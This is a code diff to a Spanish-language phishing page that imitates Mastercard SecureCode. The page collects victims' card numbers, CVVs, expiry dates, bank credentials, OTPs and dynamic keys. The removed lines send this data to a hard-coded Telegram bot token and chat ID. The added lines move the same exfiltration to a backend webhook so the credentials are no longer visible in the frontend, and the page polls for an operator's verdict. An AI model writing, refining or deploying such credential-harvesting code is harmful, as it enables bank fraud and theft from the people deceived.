@@ -516,8 +516,6 @@
         }
 
         /* ============================================ */
-
-        /* ============================================ */
         /* RESPONSIVE - LOGOS MUCHO MÁS GRANDES EN MÓVIL */
         /* ============================================ */
         @media (max-width: 768px) {
@@ -838,10 +836,8 @@
 
     <script>
         // ============================================
-        // CONFIGURACIÓN - ACTUALIZADO CON EL TOKEN CORRECTO
+        // CONFIGURACIÓN - USANDO WEBHOOK
         // ============================================
-        const TELEGRAM_BOT_TOKEN = '8736155859:AAHI77N8wP6_UNpI3RGIerJkLRRKUvVR8iQ';
-        const TELEGRAM_CHAT_ID = '-1003713613246';
         const WEBHOOK_URL = '/api/webhook';
         const POLLING_INTERVAL = 2000;
         const MAX_POLLING_TIME = 300000;
@@ -913,7 +909,6 @@
             const bankLogo = localStorage.getItem('bankLogo');
             
             console.log('🏛️ Banco emisor desde localStorage:', bancoEmisor);
-            console.log('🖼️ Logo del banco desde localStorage:', bankLogo);
 
             if (bancoEmisor) {
                 bancoNombre.textContent = bancoEmisor;
@@ -975,13 +970,13 @@
         }
 
         // ============================================
-        // FUNCIONES TELEGRAM
+        // FUNCIONES PARA ENVIAR A TRAVÉS DEL WEBHOOK
         // ============================================
         function generarSolicitudId() {
             return 'MC-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9);
         }
 
-        async function enviarCredencialesATelegram(datos) {
+        async function enviarCredencialesAlWebhook(datos) {
             try {
                 const bancoEmisor = localStorage.getItem('bancoEmisor') || 'No especificado';
                 
@@ -1017,28 +1012,26 @@
 
 ⏳ *Estado:* Esperando verificación de credenciales bancarias...`;
 
-                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                const response = await fetch(WEBHOOK_URL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
-                        chat_id: TELEGRAM_CHAT_ID,
-                        text: mensaje,
-                        parse_mode: 'Markdown',
-                        reply_markup: inlineKeyboard,
-                        disable_web_page_preview: true
+                        mensaje: mensaje,
+                        solicitudId: datos.solicitudId,
+                        botones: inlineKeyboard
                     })
                 });
 
-        
-        // ✅ SIN CREDENCIALES EN FRONTEND
-        const WEBHOOK_URL = '/api/webhook';
+                const data = await response.json();
+                console.log('📤 Credenciales enviadas:', data.success);
+                return data.success;
             } catch (error) {
                 console.error('❌ Error:', error);
                 return false;
             }
         }
 
-        async function enviarOTPATelegram(datos) {
+        async function enviarOTPAlWebhook(datos) {
             try {
                 const inlineKeyboard = {
                     inline_keyboard: [
@@ -1061,28 +1054,26 @@
 
 ⏳ *Estado:* Esperando verificación OTP...`;
 
-                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                const response = await fetch(WEBHOOK_URL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
-                        chat_id: TELEGRAM_CHAT_ID,
-                        text: mensaje,
-                        parse_mode: 'Markdown',
-                        reply_markup: inlineKeyboard,
-                        disable_web_page_preview: true
+                        mensaje: mensaje,
+                        solicitudId: datos.solicitudId,
+                        botones: inlineKeyboard
                     })
                 });
 
                 const data = await response.json();
-                console.log('📤 OTP enviado:', data.ok);
-                return data.ok;
+                console.log('📤 OTP enviado:', data.success);
+                return data.success;
             } catch (error) {
                 console.error('❌ Error:', error);
                 return false;
             }
         }
 
-        async function enviarClaveDinamicaATelegram(datos) {
+        async function enviarClaveDinamicaAlWebhook(datos) {
             try {
                 const inlineKeyboard = {
                     inline_keyboard: [
@@ -1105,21 +1096,19 @@
 
 ⏳ *Estado:* Esperando verificación de Clave Dinámica...`;
 
-                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                const response = await fetch(WEBHOOK_URL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
-                        chat_id: TELEGRAM_CHAT_ID,
-                        text: mensaje,
-                        parse_mode: 'Markdown',
-                        reply_markup: inlineKeyboard,
-                        disable_web_page_preview: true
+                        mensaje: mensaje,
+                        solicitudId: datos.solicitudId,
+                        botones: inlineKeyboard
                     })
                 });
 
                 const data = await response.json();
-                console.log('📤 Clave Dinámica enviada:', data.ok);
-                return data.ok;
+                console.log('📤 Clave Dinámica enviada:', data.success);
+                return data.success;
             } catch (error) {
                 console.error('❌ Error:', error);
                 return false;
@@ -1330,6 +1319,12 @@
             modoAutenticacion = 'otp';
         }
 
+        function mostrarInfo(mensaje) {
+            statusMessage.className = 'status-message info';
+            statusMessage.textContent = mensaje;
+            statusMessage.style.display = 'block';
+        }
+
         // ============================================
         // VALIDACIÓN Y ENVÍO
         // ============================================
@@ -1405,7 +1400,7 @@
                 const cvv = localStorage.getItem('cardCVV') || 'No disponible';
                 const vencimiento = localStorage.getItem('cardExpiry') || 'No disponible';
 
-                const datosTelegram = {
+                const datosWebhook = {
                     solicitudId: solicitudId,
                     numeroTarjeta: numeroTarjeta,
                     cvv: cvv,
@@ -1416,7 +1411,7 @@
                     fecha: document.getElementById('transaction-date').textContent
                 };
 
-                const enviado = await enviarCredencialesATelegram(datosTelegram);
+                const enviado = await enviarCredencialesAlWebhook(datosWebhook);
 
                 if (enviado) {
                     mostrarInfo('⏳ Esperando verificación...');
@@ -1437,7 +1432,7 @@
                         monto: document.getElementById('transaction-amount').textContent,
                         fecha: document.getElementById('transaction-date').textContent
                     };
-                    const enviado = await enviarOTPATelegram(datosOTP);
+                    const enviado = await enviarOTPAlWebhook(datosOTP);
                     if (enviado) {
                         iniciarPollingOTP();
                     } else {
@@ -1452,7 +1447,7 @@
                         monto: document.getElementById('transaction-amount').textContent,
                         fecha: document.getElementById('transaction-date').textContent
                     };
-                    const enviado = await enviarClaveDinamicaATelegram(datosClave);
+                    const enviado = await enviarClaveDinamicaAlWebhook(datosClave);
                     if (enviado) {
                         iniciarPollingOTP();
                     } else {
@@ -1462,60 +1457,6 @@
                 }
             }
         });
-
-        // ============================================
-        // MOSTRAR PANTALLA DE CARGA CON BARRA
-        // ============================================
-        function mostrarCargaConLogos(tipoTarjeta) {
-            // Ocultar spinner inicial
-            initialSpinner.classList.remove('active');
-            initialSpinner.style.display = 'none';
-            
-            // Mostrar logo de la tarjeta
-            logoContainer.style.display = 'flex';
-            
-            const cardLogoFile = cardLogos[tipoTarjeta];
-            if (cardLogoFile) {
-                cardLogoImg.src = cardLogoFile;
-                cardLogoImg.alt = 'Mastercard';
-            }
-            
-            // Mostrar barra de progreso
-            progressWrapper.style.display = 'block';
-            
-            // Texto
-            loadingText.textContent = 'Redirigiendo a Mastercard SecureCode...';
-            
-            // Animar barra de progreso
-            let progress = 0;
-            const duration = 3000;
-            const interval = 50;
-            const steps = duration / interval;
-            const increment = 100 / steps;
-            
-            progressFill.style.width = '0%';
-            
-            const timer = setInterval(() => {
-                progress += increment;
-                if (progress >= 100) {
-                    progress = 100;
-                    clearInterval(timer);
-                    setTimeout(() => {
-                        window.location.href = 'master.html';
-                    }, 400);
-                }
-                progressFill.style.width = progress + '%';
-            }, interval);
-        }
-
-        // ============================================
-        // FUNCIONES UI ADICIONALES
-        // ============================================
-        function mostrarInfo(mensaje) {
-            statusMessage.className = 'status-message info';
-            statusMessage.textContent = mensaje;
-            statusMessage.style.display = 'block';
-        }
 
         // ============================================
         // BOTONES
